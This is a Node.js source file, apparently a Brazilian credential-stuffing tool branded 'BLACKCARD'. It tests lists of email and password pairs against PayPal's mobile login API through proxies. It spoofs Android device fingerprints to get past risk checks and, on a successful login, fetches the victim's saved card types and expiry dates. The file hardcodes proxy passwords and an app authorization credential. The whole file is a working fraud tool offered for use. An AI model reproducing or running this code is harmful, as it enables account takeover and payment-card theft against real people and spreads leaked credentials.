		const request = require('request')
const app = require('express')()
const http = require('http').Server(app)
const io = require('socket.io')(http)

function meupau(config) {
    return new Promise(resolve => {
        request(config, (error, retorno, d1) => resolve(d1))
    })
}

app.get('/assets/checker.js', function (req, res) {
    res.sendFile(__dirname + '/assets/checker.js');
});

app.get('/', function (req, res) {
    res.sendFile(__dirname + '/index.html');
});

io.on('connection', socket => {
    socket.on('chk', data => {
        let linhas = data;
        linhas = linhas.filter((value) => {
            var explode = value.replace(/[:/;\\» ]/gmsi, '|').split('|').filter((v) => (v.trim()));
            var email = explode[0] || '';
            var senha = explode[1] || '';

            const _ = async function () {

                let d1 = await meupau({
                    url: 'https://api-m.paypal.com/v1/oauth2/login',
                    proxy: 'http://auto:xXdbQfpMpYuZ9STQftx2QYXuf@proxy.apify.com:8000',
                    gzip: true,
                    method: 'post',
                    body: `password=${senha}&device_name=tulip&grant_type=password&scope=https://uri.paypal.com/services/payments/basic&response_type=token&scope_consent_context=access_token&risk_data=%7B%22app_guid%22%3A%224926f929-f985-4d8f-9d6d-d277f1b5e41b%22%2C%22app_id%22%3A%22io.miltec.vodi%22%2C%22app_version%22%3A%223.0.6%22%2C%22bssid%22%3A%2202%3A00%3A00%3A00%3A00%3A00%22%2C%22comp_version%22%3A%223.6.0.release%22%2C%22conf_url%22%3A%22https%3A%5C%2F%5C%2Fwww.paypalobjects.com%5C%2Fwebstatic%5C%2Frisk%5C%2Fdyson_config_android_v3.json%22%2C%22conf_version%22%3A%223.0%22%2C%22conn_type%22%3A%22MOBILE%22%2C%22device_id%22%3A%22865041041631712%22%2C%22dc_id%22%3A%223b24f02865c0aafabb98cfb84257665a%22%2C%22device_model%22%3A%22Redmi+Note+6+Pro%22%2C%22device_name%22%3A%22tulip%22%2C%22device_uptime%22%3A1675008%2C%22ip_addrs%22%3A%22100.71.138.176%22%2C%22ip_addresses%22%3A%5B%22fe80%3A%3A90a9%3Adbff%3Afeb6%3Ab6f3%25dummy0%22%2C%22fe80%3A%3A351f%3A1f54%3A3a0f%3A4264%25rmnet_data0%22%2C%22fe80%3A%3Abe5e%3A1855%3A90e9%3A31be%25rmnet_data1%22%2C%222804%3Ad49%3A1201%3A8d13%3Abe5e%3A1855%3A90e9%3A31be%22%2C%22100.71.138.176%22%2C%2210.1.10.1%22%5D%2C%22linker_id%22%3A%2220f0ef52-0a88-434d-a52e-7145afef967e%22%2C%22locale_country%22%3A%22BR%22%2C%22locale_lang%22%3A%22pt%22%2C%22mac_addrs%22%3A%2202%3A00%3A00%3A00%3A00%3A00%22%2C%22os_type%22%3A%22Android%22%2C%22os_version%22%3A%229%22%2C%22payload_type%22%3A%22full%22%2C%22phone_type%22%3A%22gsm%22%2C%22risk_comp_session_id%22%3A%225cfb579c-15ee-4332-9a5f-74db4f544f48%22%2C%22roaming%22%3Afalse%2C%22sim_operator_name%22%3A%22Oi%22%2C%22sim_serial_number%22%3A%228955313929739563467F%22%2C%22sms_enabled%22%3Atrue%2C%22ssid%22%3A%22%3Cunknown+ssid%3E%22%2C%22subscriber_id%22%3A%22724313946046431%22%2C%22timestamp%22%3A1573936951534%2C%22total_storage_space%22%3A54020030464%2C%22tz_name%22%3A%22Brasilia+Standard+Time%22%2C%22ds%22%3Afalse%2C%22tz%22%3A-10800000%2C%22network_operator%22%3A%2272431%22%2C%22source_app%22%3A12%2C%22source_app_version%22%3A%222.16.0%22%2C%22is_emulator%22%3Afalse%2C%22is_rooted%22%3Afalse%2C%22pairing_id%22%3A%221c1e4dfb9368400aac157648943e3580%22%2C%22app_first_install_time%22%3A1573934945429%2C%22app_last_update_time%22%3A1573934945429%2C%22android_id%22%3A%22604f0af79514f838%22%2C%22serial_number%22%3A%22635b754a%22%2C%22gsf_id%22%3A%2231f7e6068c64fd43%22%2C%22VPN_setting%22%3A%22tun0%22%2C%22pm%22%3A%224ec3%22%2C%22mg_id%22%3A%2290cae25c20774dfa51e28dbcb5046623%22%7D&redirect_uri=urn%3Aietf%3Awg%3Aoauth%3A2.0%3Aoob&email=${email}`,
                    headers: {
                        'Host': 'api-m.paypal.com',
                        'authorization': 'Basic QVZnR2J5MkVNZWgtQjU1SXJ0dkFjZG5TaFVSdl9aUUwxUlAwOXk3aU1HUXR5NTVVbDhrQV9ia2luRzJsMkpjek5ERUo2NDJwa2tfQTJuWEw=:',
                        'accept': 'application/json; charset=utf-8',
                        'accept-language': 'en_US',
                        'content-type': 'application/x-www-form-urlencoded',
                        'user-agent': 'PayPalSDK/PayPal-Android-SDK 2.16.0 (Android 9; Xiaomi Redmi Note 6 Pro; )',
                        'paypal-item-id': '9e0a2dcd7d4e78872db87eaf220dc42470b4bc98',
                        'accept-encoding': 'gzip'
                    }
                });

                auth = JSON.parse(d1)
                console.log(auth)

                let token = auth['access_token'];

                if (auth['access_token']) {
                if (auth['error'] === "stepup_required") {
                        socket.emit('resultado', { status: 0, msg: `<font color="green">#Aprovada</font> ${email}|${senha} | Verificação: <font color='#ff0000'>stepup_required</font>` })
                    } else {
                        let d2 = await meupau({
                            url: 'https://api-m.paypal.com/v1/mfsconsumer/wallet/account?id=BANK%2CCREDEBIT',
                            proxy: 'http://auto:gf7JLipLr4Zm4G4JA6NfQoptp@proxy.apify.com:8000',
                            gzip: true,
                            method: 'get',
                            headers: {
                              "Accept": "application/json",
                              "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G955N Build/NRD90M)",
                              "X-Paypal-Consumerapp-Context": `%7B%22accountCountry%22%3A%22BR%22%2C%22visitId%22%3A%22${token}%22%2C%22riskVisitorId%22%3A%22Soxk5lWaBoo5TwywrFtTNCyE6eK7wI_zapQlzGwGvCYgTThd0aMMeEql-sIX7WGgEeVzBod44unuzNsP%22%2C%22visitorId%22%3A%2217085c2548506592%22%2C%22deviceLanguage%22%3A%22pt%22%2C%22deviceLocale%22%3A%22pt_BR%22%2C%22appName%22%3A%22com.paypal.android.p2pmobile%22%2C%22appGuid%22%3A%221ce530b2-860b-4893-9fab-dbc4a60a2537%22%2C%22appVersion%22%3A%226.10.0%22%2C%22sdkVersion%22%3A%222.8.5%22%2C%22deviceOS%22%3A%22Android%22%2C%22deviceOSVersion%22%3A%225.1.1%22%2C%22deviceMake%22%3A%22samsung%22%2C%22deviceModel%22%3A%22SM-G955N%22%2C%22deviceType%22%3A%22Android%22%2C%22deviceNetworkType%22%3A%22UMTS%22%2C%22deviceNetworkCarrier%22%3A%22Telet%22%2C%22deviceId%22%3A%2217085c2548506592%22%2C%22usageTrackerSessionId%22%3A%2216402407%22%7D`,
                              "Authorization": `Bearer ${token}`
                            }
                        });

                        let cece = JSON.parse(d2);
                        let ccs = (cece.result.artifacts.filter(a => a.cardType).length != 0) ? `${cece.result.artifacts.filter(a => a.cardType).map(a => `${a.cardType.shortName} ${a.expirationMonth}/${a.expirationYear}`).join(' - ')}`: 'Sem Cartão';
                        socket.emit('resultado', { status: 0, msg: `<font color="#0400ff">#Aprovada</font> ${email}|${senha} |  <font color='#fbff00'> ${ccs} </font>  ` })
                    }

                } else if (auth['error'] === "invalid_user") {
                    socket.emit('resultado', { status: 1, msg: `<font color="#ff0000">#Reprovada</font> ${email}|${senha} | Retorno: <font color='#ff0000'>Email|Senha Incorreto</font>` })
                } else if (auth['error'] === "invalid_public_credential") {
                    socket.emit('resultado', { status: 1, msg: `<font color="#ff0000">#Reprovada</font> ${email}|${senha} | Retorno: <font color='#ff0000'>Public credential not present</font>` })
                } else {
                    socket.emit('resultado', { status: 1, msg: `<font color="yellow">#Reprovada</font> ${email}|${senha} | Retorno: <font color='yellow'>Muitos pedidos. Bloqueado devido a limitação de taxa.</font>` })
                }
            }()
        });
    })
})

http.listen(80, function () {
    console.log('└(-_-)┘');
    console.log('═══════════════');
    console.log('(~♥˘◡˘♥)~');
    console.log('═══════════════');
    console.log('BLACKCARD');
    console.log('═══════════════');
    console.log('Funcional 24/7');
});
